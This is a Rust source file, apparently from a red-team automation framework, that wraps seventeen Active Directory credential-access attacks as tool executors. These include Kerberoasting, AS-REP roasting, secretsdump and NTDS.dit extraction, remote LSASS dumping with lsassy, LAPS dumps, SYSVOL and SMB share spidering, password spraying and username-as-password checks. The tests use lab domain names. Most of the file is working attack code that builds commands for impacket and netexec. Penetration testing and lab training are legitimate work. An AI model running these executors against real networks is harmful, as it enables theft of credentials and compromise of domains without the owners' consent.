//! Credential access tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_i64, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

// ---------------------------------------------------------------------------
// 1. Kerberoast
// ---------------------------------------------------------------------------

/// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-GetUserSPNs")
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 2. AS-REP Roast
// ---------------------------------------------------------------------------

/// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(60)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 3. Kerberos user enumeration (no auth)
// ---------------------------------------------------------------------------

/// Enumerate valid usernames via Kerberos pre-auth without credentials.
pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let users_file = required_str(args, "users_file")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/");

    CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-usersfile", users_file)
        .flag("-dc-ip", dc_ip)
        .arg("-no-pass")
        .timeout_secs(180)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 4. Secretsdump
// ---------------------------------------------------------------------------

/// Dump secrets via `impacket-secretsdump` with password, hash, or Kerberos auth.
pub async fn secretsdump(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;
    let dc_ip = optional_str(args, "dc_ip");
    let use_kerberos = optional_bool(args, "use_kerberos").unwrap_or(false);
    let ticket_path = optional_str(args, "ticket_path");
    let timeout_minutes = optional_i64(args, "timeout_minutes");

    let timeout_secs = timeout_minutes.map(|m| (m * 60) as u64).unwrap_or(180);

    let (auth_string, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    let mut cmd = CommandBuilder::new("impacket-secretsdump");

    cmd = cmd.flag_opt("-dc-ip", dc_ip);

    if use_kerberos {
        cmd = cmd.arg("-k").arg("-no-pass");
        if let Some(tp) = ticket_path {
            cmd = cmd.env("KRB5CCNAME", tp);
        }
    } else {
        cmd = cmd.args(extra_args);
    }

    cmd = cmd.arg(&auth_string);

    cmd.timeout_secs(timeout_secs).execute().await
}

// ---------------------------------------------------------------------------
// 5. Lsassy
// ---------------------------------------------------------------------------

/// Dump LSASS credentials remotely via `lsassy`.
pub async fn lsassy(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;
    let method = optional_str(args, "method");

    let mut cmd = CommandBuilder::new("lsassy")
        .flag("-d", domain)
        .flag("-u", username);

    if let Some(h) = hash {
        let h = if h.contains(':') {
            h.to_string()
        } else {
            format!(":{h}")
        };
        cmd = cmd.flag("-H", h);
    } else if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }

    cmd = cmd.arg(target);
    cmd = cmd.flag_opt("-m", method);

    cmd.timeout_secs(120).execute().await
}

// ---------------------------------------------------------------------------
// 6. Domain admin checker
// ---------------------------------------------------------------------------

/// Check for admin access on targets via `netexec smb --admin-status`.
pub async fn domain_admin_checker(args: &Value) -> Result<ToolOutput> {
    let targets = required_str(args, "targets")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let domain = optional_str(args, "domain");

    let cred_args = credentials::netexec_creds(username, password, hash, domain);

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(targets)
        .args(cred_args)
        .arg("--admin-status")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 7. GPP password finder
// ---------------------------------------------------------------------------

/// Search for Group Policy Preferences passwords via `netexec smb -M gpp_autologin`.
pub async fn gpp_password_finder(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "gpp_autologin")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 8. SYSVOL script search
// ---------------------------------------------------------------------------

/// Spider SYSVOL for scripts and config files via `netexec smb -M spider_plus`.
pub async fn sysvol_script_search(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400")
        .timeout_secs(300)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 9. LAPS dump
// ---------------------------------------------------------------------------

/// Dump LAPS passwords via `netexec ldap -M laps`.
pub async fn laps_dump(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("ldap")
        .arg(target)
        .args(cred_args)
        .flag("-M", "laps")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 10. LDAP search descriptions
// ---------------------------------------------------------------------------

/// Search for user descriptions containing credentials via `ldapsearch`.
pub async fn ldap_search_descriptions(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let base_dn = optional_str(args, "base_dn");

    // Build base DN from domain if not explicitly provided.
    let computed_base_dn = match base_dn {
        Some(dn) => dn.to_string(),
        None => domain
            .split('.')
            .map(|part| format!("DC={part}"))
            .collect::<Vec<_>>()
            .join(","),
    };

    let bind_dn = format!("{username}@{domain}");
    let ldap_uri = format!("ldap://{target}");

    CommandBuilder::new("ldapsearch")
        .arg("-x")
        .flag("-H", &ldap_uri)
        .flag("-D", &bind_dn)
        .flag("-w", password)
        .flag("-b", &computed_base_dn)
        .arg("(&(objectClass=user)(description=*))")
        .arg("sAMAccountName")
        .arg("description")
        .arg("userPrincipalName")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 11. SMB client spider
// ---------------------------------------------------------------------------

/// Spider SMB shares for interesting files via `netexec smb -M spider_plus`.
pub async fn smbclient_spider(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let pattern = optional_str(args, "pattern");
    let depth = optional_i64(args, "depth");

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    let mut opts = "DOWNLOAD_FLAG=True MAX_FILE_SIZE=102400".to_string();
    if let Some(p) = pattern {
        opts.push_str(&format!(" PATTERN={p}"));
    }
    if let Some(d) = depth {
        opts.push_str(&format!(" DEPTH={d}"));
    }

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "spider_plus")
        .flag("-o", &opts)
        .timeout_secs(300)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 12. NTDS.dit extract
// ---------------------------------------------------------------------------

/// Extract NTDS.dit secrets via `impacket-secretsdump -ntds drsuapi`.
pub async fn ntds_dit_extract(args: &Value) -> Result<ToolOutput> {
    let domain = optional_str(args, "domain");
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target = required_str(args, "target")?;

    let (auth_string, extra_args) =
        credentials::impacket_auth(domain, username, password, hash, target);

    CommandBuilder::new("impacket-secretsdump")
        .arg("-ntds")
        .arg("drsuapi")
        .args(extra_args)
        .arg(&auth_string)
        .timeout_secs(180)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 13. Password policy
// ---------------------------------------------------------------------------

/// Retrieve the domain password policy via `netexec smb --pass-pol`.
pub async fn password_policy(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .arg("--pass-pol")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 14. Password spray
// ---------------------------------------------------------------------------

/// Spray a single password across a user list via `netexec smb`.
pub async fn password_spray(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = required_str(args, "users_file")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;
    let delay_seconds = optional_i64(args, "delay_seconds");

    let cred_args = credentials::netexec_creds(None, Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", users_file)
        .args(cred_args)
        .arg("--continue-on-success")
        .flag_opt("--jitter", delay_seconds.map(|d| d.to_string()))
        .timeout_secs(300)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 15. Username as password
// ---------------------------------------------------------------------------

/// Test each username as its own password via `netexec smb --no-bruteforce`.
pub async fn username_as_password(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let users_file = required_str(args, "users_file")?;
    let domain = required_str(args, "domain")?;

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .flag("-u", users_file)
        .flag("-p", users_file)
        .flag("-d", domain)
        .arg("--no-bruteforce")
        .arg("--continue-on-success")
        .timeout_secs(300)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 16. Check Credential Manager entries
// ---------------------------------------------------------------------------

/// Enumerate Credential Manager / Chrome entries via `netexec smb -M enum_chrome`.
pub async fn check_credman_entries(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "enum_chrome")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 17. Check autologon registry
// ---------------------------------------------------------------------------

/// Query Winlogon autologon registry values via `netexec smb -M reg-query`.
pub async fn check_autologon_registry(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let domain = required_str(args, "domain")?;

    let cred_args = credentials::netexec_creds(Some(username), Some(password), None, Some(domain));

    CommandBuilder::new("netexec")
        .arg("smb")
        .arg(target)
        .args(cred_args)
        .flag("-M", "reg-query")
        .flag(
            "-o",
            "QUERY=HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        )
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// Verify that the base_dn builder produces correct LDAP distinguished names.
    #[test]
    fn test_base_dn_from_domain() {
        let domain = "contoso.local";
        let dn: String = domain
            .split('.')
            .map(|p| format!("DC={p}"))
            .collect::<Vec<_>>()
            .join(",");
        assert_eq!(dn, "DC=contoso,DC=local");
    }

    /// Verify that the base_dn builder handles a deeper domain.
    #[test]
    fn test_base_dn_from_child_domain() {
        let domain = "north.sevenkingdoms.local";
        let dn: String = domain
            .split('.')
            .map(|p| format!("DC={p}"))
            .collect::<Vec<_>>()
            .join(",");
        assert_eq!(dn, "DC=north,DC=sevenkingdoms,DC=local");
    }

    /// Verify password_spray builds args for jitter correctly (presence only).
    #[test]
    fn test_password_spray_args_shape() {
        // We can't fully execute without the binary, but we can verify
        // the required_str / optional helpers parse correctly.
        let args = json!({
            "target": "192.168.58.10",
            "users_file": "/tmp/users.txt",
            "password": "Welcome1",
            "domain": "contoso.local",
            "delay_seconds": 5
        });
        assert_eq!(required_str(&args, "target").unwrap(), "192.168.58.10");
        assert_eq!(optional_i64(&args, "delay_seconds"), Some(5));
    }

    /// Verify username_as_password parses required fields.
    #[test]
    fn test_username_as_password_args() {
        let args = json!({
            "target": "192.168.58.10",
            "users_file": "/tmp/users.txt",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "target").is_ok());
        assert!(required_str(&args, "users_file").is_ok());
        assert!(required_str(&args, "domain").is_ok());
    }
}
